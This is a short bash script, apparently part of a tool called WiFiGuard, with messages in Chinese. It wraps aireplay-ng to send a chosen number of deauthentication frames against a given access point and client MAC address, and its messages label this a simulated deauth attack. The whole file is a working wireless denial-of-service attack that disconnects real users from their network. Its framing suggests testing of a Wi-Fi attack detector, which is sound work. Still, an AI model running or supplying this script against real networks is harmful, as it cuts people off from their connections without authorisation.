#!/bin/bash
INTERFACE="${1:-wlp61s0mon}"

if [ -z "$2" ] || [ -z "$3" ]; then
    echo "用法: sudo $0 <接口> <AP的MAC> <客户端MAC> [攻击次数]"
    echo ""
    echo "示例: sudo $0 wlp61s0mon 46:C3:E1:A9:01:7E AA:BB:CC:DD:EE:FF 50"
    echo ""
    echo "提示: 运行 ./scan.sh 查看周围网络获取 MAC 地址"
    exit 1
fi

INTERFACE="$1"
AP_MAC="$2"
CLIENT_MAC="$3"
COUNT="${4:-50}"

echo "[WiFiGuard] 模拟Deauth攻击..."
echo "  接口: $INTERFACE"
echo "  目标 AP: $AP_MAC"
echo "  目标客户端: $CLIENT_MAC"
echo "  攻击次数: $COUNT"

sudo aireplay-ng --deauth "$COUNT" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
